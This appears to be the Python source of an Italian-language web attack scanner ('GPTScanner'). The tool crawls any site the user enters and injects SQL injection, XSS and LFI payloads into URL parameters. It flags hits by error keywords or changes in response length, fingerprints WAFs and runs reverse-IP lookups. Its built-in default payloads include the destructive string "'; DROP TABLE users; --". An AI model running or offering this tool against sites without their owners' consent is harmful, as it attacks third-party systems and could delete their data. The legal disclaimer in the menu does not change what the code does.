import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import csv
import os
import time
import socket
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

def load_payloads(path=None):
    if path and os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            payloads = [line.strip() for line in f if line.strip()]
            print(f"{Fore.YELLOW}[*] Caricati {len(payloads)} payload da {path}{Style.RESET_ALL}")
            return payloads
    default_payloads = ["'", "' OR '1'='1", "'; DROP TABLE users; --"]
    print(f"{Fore.YELLOW}[!] File payload non trovato, uso payload di default ({len(default_payloads)}).{Style.RESET_ALL}")
    return default_payloads

def get_all_links(base_url):
    try:
        response = requests.get(base_url, timeout=10)
    except Exception as e:
        print(f"[!] Errore durante il download: {e}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    links = set()
    for tag in soup.find_all('a', href=True):
        full_url = urljoin(base_url, tag['href'])
        links.add(full_url)

    return list(links)

def filter_links_with_params(links):
    filtered = [link for link in links if '?' in link]
    print(f"{Fore.CYAN}[*] Link con parametri trovati: {len(filtered)}{Style.RESET_ALL}")
    return filtered

def is_significantly_different(resp1, resp2):
    if not resp1 or not resp2:
        return False
    len1, len2 = len(resp1), len(resp2)
    if len1 == 0 or len2 == 0:
        return False
    diff_ratio = abs(len1 - len2) / max(len1, len2)
    return diff_ratio > 0.2

def test_single_url(link, payloads, writer=None):
    parsed = urlparse(link)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query)
    normal_response = None
    vulnerable_links = []

    for key in params:
        for payload in payloads:
            new_params = params.copy()
            new_params[key] = payload
            try:
                injected_url = requests.Request('GET', base, params=new_params).prepare().url
                resp_payload = requests.get(injected_url, timeout=10)

                if not normal_response:
                    normal_url = requests.Request('GET', base, params=params).prepare().url
                    normal_response = requests.get(normal_url, timeout=10)

                errors = ["sql", "syntax", "mysql", "you have an error", "warning", "xss", "<script", "etc/passwd"]
                is_vuln = any(e in resp_payload.text.lower() for e in errors) or is_significantly_different(normal_response.text, resp_payload.text)

                if is_vuln:
                    print(Fore.GREEN + f"[VULNERABILE] {injected_url}")
                    vulnerable_links.append(injected_url)
                    if writer:
                        writer.writerow(["VULNERABILE", injected_url])
                else:
                    print(Fore.RED + f"[NON VULNERABILE] {injected_url}")
                    if writer:
                        writer.writerow(["OK", injected_url])
            except Exception as e:
                print(f"[!] Errore su {injected_url}: {e}")
    return vulnerable_links

def prepare_csv(filename):
    f = open(filename, 'w', newline='', encoding='utf-8')
    writer = csv.writer(f)
    writer.writerow(["Status", "URL"])
    return f, writer

def detect_waf(url):
    try:
        response = requests.get(url, timeout=10)
        headers = response.headers
        waf_signatures = [
            "X-Sucuri-ID", "X-Akamai-Transformed", "X-CDN", "X-Frame-Options", "X-Mod-Security",
            "Server: cloudflare", "X-Powered-By-AspNet", "X-Distil-CS"
        ]
        print("\n[RILEVAMENTO WAF]")
        found = False
        for key, value in headers.items():
            for sig in waf_signatures:
                if sig.lower() in key.lower() or sig.lower() in value.lower():
                    print(f"{Fore.GREEN}[+] Potenziale WAF rilevato: {key}: {value}{Style.RESET_ALL}")
                    found = True
        if not found:
            print(f"{Fore.YELLOW}[-] Nessun WAF rilevato nelle intestazioni comuni.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Errore nel rilevamento WAF: {e}{Style.RESET_ALL}")

def reverse_ip_lookup(domain):
    print("\n[REVERSE IP LOOKUP]")
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] IP del dominio {domain}: {ip}")
        url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
        resp = requests.get(url, timeout=10)
        if "error" in resp.text.lower():
            print(f"{Fore.RED}[!] Errore dal servizio Reverse IP: {resp.text}{Style.RESET_ALL}")
        else:
            print(f"{Fore.CYAN}[+] Domini trovati sull'IP {ip}:{Style.RESET_ALL}\n{resp.text}")
    except Exception as e:
        print(f"{Fore.RED}[!] Errore nel reverse IP: {e}{Style.RESET_ALL}")

def crawl_recursive(url, depth=5, visited=None):
    if visited is None:
        visited = set()
    if depth == 0 or url in visited:
        return visited
    try:
        response = requests.get(url, timeout=10)
        visited.add(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for tag in soup.find_all("a", href=True):
            full_url = urljoin(url, tag["href"])
            if urlparse(full_url).netloc == urlparse(url).netloc:
                crawl_recursive(full_url, depth-1, visited)
    except:
        pass
    return visited

def main_menu():
    while True:
        print(f"""
{Fore.CYAN}+-+-+-+-+-+-+-+-+-+-+-+{Style.RESET_ALL}
{Fore.CYAN}|G|P|T|-|S|c|a|n|n|e|r|{Style.RESET_ALL}
{Fore.CYAN}+-+-+-+-+-+-+-+-+-+-+-+{Style.RESET_ALL}
{Fore.CYAN}[!] Disclaimer legale: Attaccare obiettivi senza previo consenso reciproco è illegale.{Style.RESET_ALL}
{Fore.CYAN}[!] È responsabilità dell'utente finale rispettare tutte le leggi locali, statali e federali applicabili.{Style.RESET_ALL}
{Fore.CYAN}[!] Gli sviluppatori non si assumono alcuna responsabilità e non sono responsabili per eventuali usi impropri o danni causati da questo programma.{Style.RESET_ALL}
{Fore.CYAN}+-+-+-+-+-+-+-+-+-+-+-+{Style.RESET_ALL}
{Fore.CYAN}===== MENU GPTScanner ====={Style.RESET_ALL}
1) SQL Injection
2) XSS Injection
3) LFI Injection
4) Scansione Personalizzata
5) Rilevamento WAF & Reverse IP
6) DEEP Crawler (.CSV output)
0) Esci
""")
        scelta = input("Seleziona un'opzione: ")
        if scelta in ["1", "2", "3", "4"]:
            target = input("Inserisci l'URL del sito (es. https://esempio.com): ").strip()
            links = get_all_links(target)
            links = filter_links_with_params(links)
            if not links:
                print(f"{Fore.RED}[!] Nessun link con parametri trovato. Interrompo la scansione.{Style.RESET_ALL}")
                continue
            if scelta == "1":
                payloads = load_payloads("sqli_payloads.txt")
            elif scelta == "2":
                payloads = load_payloads("xss_payloads.txt")
            elif scelta == "3":
                payloads = load_payloads("lfi_payloads.txt")
            else:
                path = input("Inserisci il percorso del file con payload personalizzati: (es. /home/GPTScanner/payloads.txt ").strip()
                payloads = load_payloads(path)
            f, writer = prepare_csv("scan_results.csv")
            for link in links:
                test_single_url(link, payloads, writer)
            f.close()
            print("[+] Scansione completata. Risultati salvati in scan_results.csv")
        elif scelta == "5":
            target = input("Inserisci l'URL del sito (es. https://esempio.com): ").strip()
            detect_waf(target)
            reverse_ip_lookup(urlparse(target).hostname)
        elif scelta == "6":
            target = input("Inserisci l'URL di partenza (es. https://esempio.com): ").strip()
            print("[*] Inizio crawling avanzato a profondità 5...")
            risultati = crawl_recursive(target, depth=5)
            with open("crawler_output.txt", "w", encoding="utf-8") as f:
                for url in sorted(risultati):
                    print(url)
                    f.write(url + "\n")
            print(f"[+] Crawling completato. {len(risultati)} URL trovati e salvati in crawler_output.txt")
        elif scelta == "0":
            print("Uscita dal programma.")
            break
        else:
            print("[!] Opzione non valida o non ancora implementata.")

if __name__ == "__main__":
    main_menu()
